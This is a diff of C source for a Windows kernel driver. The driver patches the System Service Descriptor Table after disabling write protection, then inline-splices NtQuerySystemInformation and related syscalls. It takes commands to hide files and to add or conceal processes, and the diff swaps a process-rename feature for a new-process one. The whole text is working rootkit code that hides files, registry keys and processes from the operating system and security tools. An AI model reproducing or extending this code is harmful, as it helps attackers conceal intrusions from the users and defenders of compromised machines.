@@ -82,7 +82,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp) {
 #endif
 
     glRealNtQueryInformationFile = (NT_QUERY_INFORMATION_FILE)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_INFORMATION_FILE];
-    glRealNtQuerySystemInformation = (NT_QUERY_SYSTEM_INFORMATION)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION];
+    //glRealNtQuerySystemInformation = (NT_QUERY_SYSTEM_INFORMATION)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION];
     //glRealNtQueryDirectoryFile = (NT_QUERY_DIRECTORY_FILE)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE];
     glRealNtEnumerateKey = (NT_ENUMERATE_KEY)KeServiceDescriptorTable->Base[NUMBER_NT_ENUMERATE_KEY];
 
@@ -96,16 +96,23 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp) {
 
     reg = ClearWP();
     KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_INFORMATION_FILE] = (ULONG)HookNtQueryInformationFile;
-    KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION] = (ULONG)HookNtQuerySystemInformation;
+    //KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION] = (ULONG)HookNtQuerySystemInformation;
     //KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE] = (ULONG)HookNtQueryDirectoryFile;
     KeServiceDescriptorTable->Base[NUMBER_NT_ENUMERATE_KEY] = (ULONG)HookNtEnumerateKey;
     WriteCR0(reg);
 
-    // Init task list for rename process Создание резервного списка
-    // для выравнивания выделяемой памяти
-    ExInitializePagedLookasideList(&glPagedTaskQueueProcess, NULL, NULL, 0, sizeof(TASK_QUEUE_PROCESS), ' LFO', 0);
-    InitializeListHead(&glTaskQueueProcess);
-    //
+    
+
+    // Init task list for create process
+    addressForJmpNtQuerySystemInformation = SplicingSyscall(
+        KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION],
+        HookNtQuerySystemInformation,
+        saveByteNtQuerySystemInformation,
+        TRUE,
+        0
+    );
+
+    DbgPrint("addressForJmpNtQuerySystemInformation: %d\n", (ULONG)addressForJmpNtQuerySystemInformation);
 
     // Init task list for hide file
     addressForJmpNtNtQueryDirectoryFile = SplicingSyscall(
@@ -115,6 +122,14 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp) {
         TRUE,
         0
     );
+
+    // Init task list for rename process Создание резервного списка
+    // для выравнивания выделяемой памяти
+    ExInitializePagedLookasideList(&glPagedTaskQueueProcess, NULL, NULL, 0, sizeof(TASK_QUEUE_PROCESS), ' LFO', 0);
+    InitializeListHead(&glTaskQueueProcess);
+    //
+
+
     ExInitializePagedLookasideList(&glPagedTaskQueueFile, NULL, NULL, 0, sizeof(TASK_QUEUE_FILE), ' LFO', 0);
     InitializeListHead(&glTaskQueueFile);
     //
@@ -151,14 +166,21 @@ VOID DriverUnload(IN PDRIVER_OBJECT dob) {
 
     reg = ClearWP();
     KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_INFORMATION_FILE] = (ULONG)glRealNtQueryInformationFile;
-    KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION] = (ULONG)glRealNtQuerySystemInformation;
+    //KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION] = (ULONG)glRealNtQuerySystemInformation;
     //KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE] = (ULONG)glRealNtQueryDirectoryFile;
     KeServiceDescriptorTable->Base[NUMBER_NT_ENUMERATE_KEY] = (ULONG)glRealNtEnumerateKey;
     WriteCR0(reg);
 
-    //free list for rename process
+    //free list for create new process
+    if (addressForJmpNtQuerySystemInformation) {
+        UnhookSyscall(
+            (PUCHAR)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION],
+            saveByteNtQuerySystemInformation
+        );
+    }
     FreeListQueueProcess();
     ExDeletePagedLookasideList(&glPagedTaskQueueProcess);
+    while (SyscallNewProcessedCount);
     //
 
     //free list for hide file
@@ -216,20 +238,10 @@ ULONG_PTR HookNtQueryInformationFile(
         if (pCmd->flags & COMMAND_TEST_COMMAND) {
             DbgPrint("HookNtQueryInformationFile execute\n");
         }
-        else if (pCmd->flags & COMMAND_RENAME_PROCESS) {
-            ULONG len = 0;
-
-            if (pCmd->flags & COMMAND_BUFFER_NUMBER && pCmd->change != NULL) {
-
-                DbgPrint("RenameProcess PID:%d change:%s\n", (ULONG)pCmd->target, (PCHAR)pCmd->change);
-                TaskQueueByPID((ULONG)pCmd->target, (PCHAR)pCmd->change);
-
-            }
-            else if (pCmd->flags & COMMAND_BUFFER_POINTER && pCmd->target != NULL && pCmd->change != NULL) {
-
-                DbgPrint("RenameProcess name:%s change:%s\n", (PCHAR)pCmd->target, (PCHAR)pCmd->change);
-                TaskQueueByName((PCHAR)pCmd->target, (PCHAR)pCmd->change);
-
+        else if (pCmd->flags & COMMAND_ADD_NEW_PROCESS) {
+            if (pCmd->target != NULL && pCmd->change != NULL) {
+                //DbgPrint("New process PID: %d Name: %s\n", (ULONG)pCmd->target, (PCHAR)pCmd->change);
+                TaskQueueNewProc((ULONG)pCmd->target, (PCHAR)pCmd->change);
             }
         }
         else if (pCmd->flags & COMMAND_HIDE_FILE) {
@@ -339,14 +351,26 @@ void UnhookSyscall(PUCHAR addressSyscall, PUCHAR saveBytes) {
 // mov     ebp, esp
 //
 BOOLEAN CheckHookProlog(PUCHAR adr) {
-
     static UCHAR hookProlog[5] = { 0x8B,0xFF,0x55,0x8B,0xEC };
+    static UCHAR hookProlog2[5] = { 0x68,0x10,0x02,0x00,0x00 }; //6810020000
 
-    if ((adr[0] == hookProlog[0]) &&
-        (adr[1] == hookProlog[1]) &&
-        (adr[2] == hookProlog[2]) &&
-        (adr[3] == hookProlog[3]) &&
-        (adr[4] == hookProlog[4]))
+    if (
+            (
+                (adr[0] == hookProlog[0]) &&
+                (adr[1] == hookProlog[1]) &&
+                (adr[2] == hookProlog[2]) &&
+                (adr[3] == hookProlog[3]) &&
+                (adr[4] == hookProlog[4])
+            )
+        || 
+            (
+                (adr[0] == hookProlog2[0]) &&
+                (adr[1] == hookProlog2[1]) &&
+                (adr[2] == hookProlog2[2]) &&
+                (adr[3] == hookProlog2[3]) &&
+                (adr[4] == hookProlog2[4])
+            )
+        )
         return TRUE;
     else
         return FALSE;
